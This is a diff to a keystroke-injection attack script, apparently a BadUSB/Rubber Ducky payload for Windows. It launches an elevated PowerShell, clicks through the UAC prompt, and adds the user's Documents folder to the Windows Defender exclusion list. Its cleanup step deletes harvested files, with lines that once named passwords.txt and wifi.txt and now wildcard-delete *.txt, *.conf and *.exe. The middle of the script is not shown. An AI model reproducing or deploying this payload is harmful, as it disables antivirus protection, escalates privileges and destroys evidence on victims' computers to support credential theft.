@@ -1,7 +1,10 @@
+REM Close all Windows
 WINDOWS d
 DELAY 200
+REM Enter commandline
 WINDOWS r
 DELAY 200
+REM Start powershell
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1000
@@ -9,7 +12,7 @@ LEFTARROW
 DELAY 1000
 ENTER
 DELAY 1000
-REM Path exclude from defender
+REM Path exclude from defender. We need it later
 STRING Set-MpPreference -ExclusionPath $env:systemdrive\users\$env:username\Documents
 DELAY 500
 ENTER
@@ -63,19 +66,15 @@ REM Remove some files
 DELAY 500
 ENTER
 DELAY 1000
-STRING del passwords.txt
+STRING del *.txt
 DELAY 500
 ENTER
 DELAY 1000
-STRING del history.txt
+STRING del *.conf
 DELAY 500
 ENTER
 DELAY 1000
-STRING del wifi.txt
-DELAY 500
-ENTER
-DELAY 1000
-STRING del connected_devices.txt
+STRING del *.exe
 DELAY 500
 ENTER
 DELAY 1000
@@ -98,8 +97,3 @@ REM Show the directory
 STRING dir
 DELAY 500
 ENTER
-DELAY 1000
-STRING echo "*********** Player 1 READY *************"
-DELAY 500
-ENTER
-DELAY 1000
